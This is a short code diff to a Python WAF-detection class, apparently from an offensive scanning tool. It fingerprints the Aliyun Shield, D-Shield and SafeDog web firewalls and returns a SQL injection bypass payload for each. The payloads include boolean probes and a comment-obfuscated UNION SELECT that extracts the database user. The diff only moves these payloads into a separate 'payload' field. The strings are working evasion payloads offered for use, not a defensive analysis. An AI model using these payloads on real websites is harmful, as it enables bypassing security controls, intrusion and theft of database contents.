@@ -9,11 +9,11 @@ class Waf:
         Ddun = self.Ddun(text)
         safeDog = self.safeDog(text)
         if aliyun:
-            return {'Flag': 'True', 'wafName': '[阿里云盾] 绕过方法 ?x=1 and 1 like 1 分割线 ?x=1 and 1 like 2'}
+            return {'Flag': 'True', 'wafName': '[阿里云盾]', 'payload': '?x=1 and 1 like 1 分割线 ?x=1 and 1 like 2'}
         elif Ddun:
-            return {'Flag': 'True', 'wafName': '[D盾] 绕过方法 ?x=1 xor 0 分割线 ?x=1 xor 1'}
+            return {'Flag': 'True', 'wafName': '[D盾]', 'payload': '?x=1 xor 0 分割线 ?x=1 xor 1'}
         elif safeDog:
-            return {'Flag': 'True', 'wafName': '[安全狗] 绕过方法 /*/*//*/*!1 分割线 /*!and/*/**//*!/*!1*/, 注数据：?x=1/*!union/*/**//*!/*!select*/ 1,2,/*!user/*/**//*!/*!()*/'}
+            return {'Flag': 'True', 'wafName': '[安全狗]', 'payload': '/*/*//*/*!1 分割线 /*!and/*/**//*!/*!1*/, 注数据：?x=1/*!union/*/**//*!/*!select*/ 1,2,/*!user/*/**//*!/*!()*/'}
         else:
             return {'Flag': 'False'}
 
